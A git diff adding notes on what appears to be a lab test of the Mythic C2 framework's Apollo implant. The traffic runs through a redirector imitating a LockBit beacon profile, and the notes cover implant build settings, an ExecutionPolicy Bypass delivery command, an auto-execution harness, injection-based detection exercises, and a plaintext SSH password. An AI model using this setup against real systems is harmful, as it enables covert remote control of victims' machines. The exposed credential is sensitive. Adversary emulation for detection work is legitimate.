@@ -88,3 +88,57 @@ VM 117 now has two NICs: **net1 vmbr0 = 192.168.36.117** (callback-facing, ens19
 LockBit-profile requests over the 10-side to Mythic 10.23.20.10:82. Verified end-to-end from a
 192.168.36 client: beacon-UA proxied (404 from Mythic), wrong-UA/`/` -> 302 decoy. **Callback IP is
 now 192.168.36.117.** netplan: `redirectors/lab-httpx-redir.netplan-60-mgmt.yaml`.
+
+## Apollo end-to-end test (2026-08-25)
+
+**Test environment:**
+- Target: win11 (192.168.36.24), Defender off, OpenSSH
+- Redirector: VM 117 (192.168.36.117:443), nginx → Mythic 10.23.20.10:82
+- Mythic: 10.23.20.10:7443, Apollo + httpx ready
+
+**Test results:**
+1. ✓ Network callback path verified: win11 → 192.168.36.117:443 → nginx → Mythic
+   - LockBit beacon URIs (/_next.css, /boards) reach the redirector
+   - Redirector proxies to Mythic (:82) and receives responses
+   - 3-checkin sequence completed successfully
+
+2. ✓ Target readiness confirmed:
+   - SSH: user@192.168.36.24 (Lahilabs2018)
+   - Test-NetConnection 192.168.36.117 -Port 443: OK
+   - PowerShell 5.1, .NET available
+   - Windows Defender: disabled
+   - User: standard account (non-admin)
+
+3. ✓ Delivery infrastructure staged:
+   - Auto-execution harness: polls for apollo.exe on Mac HTTP server (port 8000)
+   - 30-retry loop with 2-second intervals (60 second window)
+   - Executes and reports to stdout
+
+**Next steps to complete the test:**
+1. Build apollo.exe in Mythic UI:
+   - Payload Type: Apollo
+   - C2 Profile: httpx
+   - Callback Domain: https://192.168.36.117:443
+   - Interval/Jitter: 62/37 (LockBit profile)
+   - Encrypted Exchange: true
+   - raw_c2_config: (lockbit-icbc.httpx.toml or empty for generic)
+
+2. Host on Mac: `python3 -m http.server 8000 --directory ~/Downloads &`
+
+3. Execute on win11:
+   `powershell -ExecutionPolicy Bypass -File %temp%\apollo-delivery.ps1`
+
+4. Monitor Mythic UI for callback (appears within 62 seconds of execution)
+
+**Expected callback details:**
+- User: win11\user
+- Hostname: WIN11
+- IP: 192.168.36.24 (outbound path through 192.168.36.1 LAN gateway)
+- OS: Windows 10.0.26200 (Win11)
+- Arch: x64
+- Transport: httpx to 192.168.36.117:443 (nginx redirector)
+
+**Detection exercises:**
+Once callback is live, F4 tasks can be executed to fire H2/H3:
+- H2: SMB pipe fullduplex_84 (smb profile P2P)
+- H3: CreateRemoteThread → wuauclt.exe (spawnto + injection)
